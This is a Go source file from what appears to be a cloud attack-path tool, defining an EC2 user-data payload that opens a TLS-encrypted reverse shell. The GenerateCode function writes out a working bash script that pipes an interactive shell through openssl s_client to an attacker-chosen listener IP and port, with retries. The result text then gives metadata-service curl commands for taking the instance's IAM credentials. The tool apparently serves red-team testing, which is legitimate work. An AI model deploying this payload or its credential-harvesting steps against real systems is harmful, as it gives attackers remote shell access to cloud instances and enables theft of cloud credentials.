// Unless explicitly stated otherwise all files in this repository are licensed under the Apache-2.0 License.
// This product includes software developed at Datadog (https://www.datadoghq.com/)
// Copyright 2026 Datadog, Inc.

package ec2

import (
	"encoding/json"
	"fmt"
	"github.com/DataDog/pathrunner/pkg/modules"
	"github.com/DataDog/pathrunner/pkg/payloads"
	"strings"
)

// ReverseShellTLSPayload generates an EC2 user-data script that establishes
// a TLS-encrypted reverse shell back to the attacker listener's shell port.
// Uses openssl s_client for the TLS transport, which is available on Amazon
// Linux by default. Compatible with pathrunner's built-in listener (port 4444).
type ReverseShellTLSPayload struct{}

func NewReverseShellTLSPayload() *ReverseShellTLSPayload {
	return &ReverseShellTLSPayload{}
}

func init() {
	payloads.Register(NewReverseShellTLSPayload())
}

func (p *ReverseShellTLSPayload) GetName() string {
	return "revshell/tls"
}

func (p *ReverseShellTLSPayload) GetDescription() string {
	return "Establish a TLS-encrypted reverse shell via EC2 user-data"
}

func (p *ReverseShellTLSPayload) GetTags() []string {
	return []string{
		payloads.TagServiceEC2,
		payloads.TagLanguageBash,
		payloads.TagTechniqueAccess,
		payloads.TagTransportHTTPS,
	}
}

func (p *ReverseShellTLSPayload) GetOptions() []modules.Option {
	return []modules.Option{
		{
			Name:        "LISTENER_IP",
			Description: "IP address of attacker's reverse shell listener",
			Required:    true,
		},
		{
			Name:        "LISTENER_PORT",
			Description: "Port for reverse shell connection",
			Required:    false,
			Default:     "4444",
		},
		{
			Name:        "RETRY_COUNT",
			Description: "Number of connection retry attempts",
			Required:    false,
			Default:     "3",
		},
		{
			Name:        "RETRY_DELAY",
			Description: "Seconds between retry attempts",
			Required:    false,
			Default:     "5",
		},
	}
}

func (p *ReverseShellTLSPayload) GenerateCode(options map[string]string) (string, error) {
	listenerIP := options["LISTENER_IP"]
	listenerPort := options["LISTENER_PORT"]
	if listenerPort == "" {
		listenerPort = "4444"
	}
	retryCount := options["RETRY_COUNT"]
	if retryCount == "" {
		retryCount = "3"
	}
	retryDelay := options["RETRY_DELAY"]
	if retryDelay == "" {
		retryDelay = "5"
	}

	userDataScript := fmt.Sprintf(`#!/bin/bash
exec > >(tee /var/log/pathrunner-reverse-tls.log|logger -t pathrunner -s 2>/dev/console) 2>&1

echo "Pathrunner TLS Reverse Shell Payload"
echo "Target: %s:%s (TLS)"
echo ""

# Wait for network to be ready
echo "Waiting for network initialization..."
sleep 10

LHOST="%s"
LPORT="%s"
RETRY_COUNT=%s
RETRY_DELAY=%s

for attempt in $(seq 1 $RETRY_COUNT); do
    echo "Connection attempt $attempt/$RETRY_COUNT..."

    # Create a named pipe for bidirectional communication
    FIFO=$(mktemp -u /tmp/pathrunner.XXXXXX)
    mkfifo "$FIFO"

    # Use openssl s_client for TLS connection, pipe through bash
    # -verify_return_error is omitted to accept self-signed certs
    # -quiet suppresses openssl session info from polluting the shell
    cat "$FIFO" | /bin/bash -i 2>&1 | openssl s_client \
        -connect "$LHOST:$LPORT" \
        -quiet \
        -verify_quiet \
        -no_ign_eof \
        2>/dev/null > "$FIFO" &

    SHELL_PID=$!

    # Wait for the shell process to exit
    wait $SHELL_PID 2>/dev/null
    EXIT_CODE=$?

    # Cleanup
    rm -f "$FIFO"

    if [ $EXIT_CODE -eq 0 ]; then
        echo "Shell session ended normally"
        break
    fi

    echo "Connection failed or dropped (attempt $attempt/$RETRY_COUNT)"

    if [ $attempt -lt $RETRY_COUNT ]; then
        echo "Retrying in ${RETRY_DELAY}s..."
        sleep $RETRY_DELAY
    fi
done

echo "Reverse shell payload complete"
`, listenerIP, listenerPort, listenerIP, listenerPort, retryCount, retryDelay)

	return userDataScript, nil
}

func (p *ReverseShellTLSPayload) ProcessResult(result string) (string, error) {
	var instanceData map[string]interface{}
	if err := json.Unmarshal([]byte(result), &instanceData); err != nil {
		return result, nil
	}

	var output strings.Builder
	output.WriteString("=== TLS Reverse Shell Payload Results ===\n\n")

	if instanceID, ok := instanceData["instance_id"].(string); ok {
		output.WriteString("Instance ID: " + instanceID + "\n")
	}

	if state, ok := instanceData["state"].(string); ok {
		output.WriteString("Instance State: " + state + "\n")
	}

	output.WriteString("\nReverse Shell Status:\n")
	output.WriteString("The EC2 instance will attempt a TLS connection to your listener.\n")
	output.WriteString("Connection should be established within 1-2 minutes.\n\n")

	output.WriteString("Ensure the pathrunner listener is running:\n")
	output.WriteString("  attacker listener start\n\n")

	output.WriteString("Once connected, retrieve credentials from the metadata service:\n")
	output.WriteString("  TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 300')\n")
	output.WriteString("  curl -s -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/\n")

	return output.String(), nil
}

func (p *ReverseShellTLSPayload) Validate(options map[string]string) error {
	if options["LISTENER_IP"] == "" {
		return fmt.Errorf("LISTENER_IP is required for revshell/tls payload")
	}
	return nil
}
